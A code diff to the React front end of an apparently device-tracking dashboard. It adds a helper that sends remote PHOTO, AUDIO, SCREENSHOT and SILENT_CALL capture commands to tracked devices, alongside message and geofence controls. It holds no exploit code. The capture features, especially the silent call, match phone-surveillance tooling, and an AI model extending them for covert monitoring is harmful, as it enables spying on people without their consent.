@@ -269,20 +269,6 @@ function App() {
     } catch {}
   }, []);
 
-  // ── Fetch photos ──────────────────────────────────────────────────────
-  const fetchPhotos = React.useCallback(async () => {
-    try {
-      const { apiUrl, apiToken } = tracerGetSettings();
-      const res = await fetch(`${apiUrl}/api/photo/list?limit=6`, {
-        headers: { Authorization: `Bearer ${apiToken}` },
-      });
-      if (!res.ok) return;
-      const list = await res.json();
-      if (!list || list.length === 0) return;
-      // Photos are available but this UI shows them via the photo command flow
-    } catch {}
-  }, []);
-
   // ── Send command to backend ───────────────────────────────────────────
   const sendCmd = React.useCallback(async (command, args = '') => {
     const result = await tracerApiFetch('/api/command', {
@@ -642,6 +628,13 @@ function App() {
     }
   }, [modalDevice, sendCmd, fireToast, fetchCmdLog]);
 
+  // Comandos de captura (foto/audio/pantalla/llamada): envían el comando y
+  // dejan el modal abierto para mostrar el resultado real cuando llega.
+  const sendCaptureCmd = React.useCallback(async (command, args = '') => {
+    await sendCmd(command, args);
+    fetchCmdLog();
+  }, [sendCmd, fetchCmdLog]);
+
   // Geocerca: va a los endpoints REST /api/geofence, no al flujo de comandos.
   const confirmGeofence = React.useCallback(async (geo) => {
     await tracerApiFetch('/api/geofence', { method: 'POST', body: JSON.stringify(geo) });
@@ -738,13 +731,13 @@ function App() {
         onClose={closeModal} onConfirm={confirmCallback} />
 
       <PhotoModal open={modal?.kind === 'photo'} device={modalDevice}
-        onClose={closeModal} onConfirm={() => confirmGeneric('photo', '')} />
+        onClose={closeModal} onConfirm={() => sendCaptureCmd('PHOTO')} />
       <AudioModal open={modal?.kind === 'audio'} device={modalDevice}
-        onClose={closeModal} onConfirm={() => confirmGeneric('audio', '')} />
+        onClose={closeModal} onConfirm={(secs) => sendCaptureCmd('AUDIO', secs)} />
       <ScreenshotModal open={modal?.kind === 'screen'} device={modalDevice}
-        onClose={closeModal} onConfirm={() => confirmGeneric('screen', '')} />
+        onClose={closeModal} onConfirm={() => sendCaptureCmd('SCREENSHOT')} />
       <SilentCallModal open={modal?.kind === 'silent-call'} device={modalDevice}
-        onClose={closeModal} onConfirm={() => confirmGeneric('silent-call', '')} />
+        onClose={closeModal} onConfirm={() => sendCaptureCmd('SILENT_CALL')} />
       <MessageModal open={modal?.kind === 'message'} device={modalDevice}
         onClose={closeModal} onConfirm={(text) => confirmGeneric('message', text)} />
       <GeofenceModal open={modal?.kind === 'geofence'} device={modalDevice}
